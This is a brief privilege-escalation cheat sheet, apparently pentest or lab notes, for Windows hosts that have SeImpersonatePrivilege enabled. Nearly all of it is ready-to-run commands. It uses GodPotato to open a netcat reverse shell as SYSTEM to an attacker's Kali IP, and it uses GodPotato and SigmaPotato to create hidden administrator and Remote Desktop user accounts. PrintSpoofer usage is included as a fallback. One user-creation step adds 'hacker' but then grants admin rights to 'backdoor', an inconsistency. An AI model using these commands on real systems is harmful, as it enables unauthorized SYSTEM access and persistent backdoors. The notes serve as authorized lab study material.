> After we have ran the basic commands the first thing we want to run is: 

```
whoami /priv
```

> Here we want to check if SEImpersonate is enabled. If it is we want to transfer over 2 files:

```
nc.exe
godpotato.exe
```

> Now we can run the exploit to get a reverse shell as SYSTEM:

```
godpotato.exe -cmd "nc.exe -e cmd.exe <kali_ip> <port>"
```

> With godpotato you can also create a exe malicious reverse shell file then execute it:

```
GodPotato -cmd "C:\Users\Public\reverse.exe"
```

> If you get a shell but cannot run commands you will need to add a new user then use runas:

```
GodPotato -cmd "net user /add hacker Password123"
GodPotato -cmd "net localgroup administrators /add backdoor"
```

```
RunasCs.exe hacker Password123 "C:/Users/Public/reverse.exe" --force-profile --logon-type 8
```

> If for some reason godpotato dosent work we can instead utilize printspoofer (check if the system is x64 first and that spooler is running with 

```
sc query spooler
```

We can download it from here: https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0

> Transfer it over to the machine then run the following:

```
printspoofer64.exe -i -c powershell
```

> We can also utilize sigmapotato if we want to add a new user on the machine then switch to the user. We transfer sigmapotato over to the machine then run the following:

```
sigmapotato.exe "net user dave4 lab /add"
sigmapotato.exe "net localgroup Administrators dave4 /add"
sigmapotato.exe "net localgroup \"Remote Desktop Users\" dave4 /add"
```

Now we can RDP into the machine as the new user we added.